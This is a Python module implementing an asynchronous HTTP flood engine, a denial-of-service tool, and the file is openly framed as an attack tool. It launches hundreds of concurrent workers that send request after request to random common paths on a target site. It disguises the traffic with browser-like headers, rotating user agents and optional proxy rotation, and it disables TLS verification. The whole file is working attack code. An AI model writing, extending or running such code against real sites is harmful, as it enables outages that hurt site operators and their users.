import asyncio
import random
import time
import aiohttp
from urllib.parse import urljoin
from utils.user_agents import random_ua
from core.stats import AttackStats
from core.proxy_rotator import ProxyRotator
from core.target import TargetInfo

COMMON_PATHS = [
    "/", "/about", "/contact", "/blog", "/news", "/products",
    "/services", "/support", "/login", "/register", "/search",
    "/api/status", "/api/health", "/assets/js/main.js",
    "/assets/css/style.css", "/favicon.ico", "/robots.txt",
    "/sitemap.xml", "/index.html", "/home", "/404",
]

METHODS = ["GET", "GET", "GET", "POST"]

class HTTPFloodEngine:
    def __init__(
        self,
        target: TargetInfo,
        workers: int = 200,
        duration: int = 37,
        stats: AttackStats = None,
        proxy_rotator: ProxyRotator = None,
        conn_timeout: float = 5.0,
        read_timeout: float = 3.0,
    ):
        self.target = target
        self.workers = workers
        self.duration = duration
        self.stats = stats or AttackStats()
        self.proxy_rotator = proxy_rotator
        self.conn_timeout = conn_timeout
        self.read_timeout = read_timeout
        self._running = False
        self._start_time = 0

    def _build_headers(self):
        return {
            "User-Agent": random_ua(),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": random.choice([
                "en-US,en;q=0.9", "es-ES,es;q=0.9", "pt-BR,pt;q=0.9",
                "de-DE,de;q=0.9", "fr-FR,fr;q=0.9", "en-GB,en;q=0.8",
            ]),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }

    def _random_path(self):
        return random.choice(COMMON_PATHS)

    async def _worker(self, session: aiohttp.ClientSession, semaphore: asyncio.Semaphore):
        timeout = aiohttp.ClientTimeout(
            total=self.conn_timeout + self.read_timeout,
            connect=self.conn_timeout,
        )
        while self._running:
            async with semaphore:
                path = self._random_path()
                url = f"{self.target.scheme}://{self.target.host}:{self.target.port}{path}"
                method = random.choice(METHODS)
                headers = self._build_headers()
                try:
                    start = time.perf_counter()
                    async with session.request(method, url, headers=headers, timeout=timeout, ssl=False) as resp:
                        data = await resp.read()
                        latency = (time.perf_counter() - start) * 1000
                        req_size = len(method) + len(url) + sum(len(k) + len(v) for k, v in headers.items())
                        self.stats.record_request(resp.status, latency, req_size, len(data))
                except asyncio.TimeoutError:
                    self.stats.record_error("timeout")
                except (aiohttp.ClientError, OSError):
                    self.stats.record_error("connection")
                except Exception:
                    self.stats.record_error("connection")

    async def _run_async(self):
        connector = aiohttp.TCPConnector(
            limit=0,
            force_close=False,
            enable_cleanup_closed=True,
            ttl_dns_cache=0,
        )
        semaphore = asyncio.Semaphore(self.workers * 2)
        async with aiohttp.ClientSession(connector=connector) as session:
            tasks = [asyncio.create_task(self._worker(session, semaphore)) for _ in range(self.workers)]
            while self._running:
                await asyncio.sleep(1)
            await asyncio.gather(*tasks, return_exceptions=True)

    def run(self):
        self._running = True
        self.stats.reset()
        self._start_time = time.time()
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._run_async())
        except KeyboardInterrupt:
            self._running = False
        finally:
            try:
                loop.close()
            except Exception:
                pass

    def stop(self):
        self._running = False
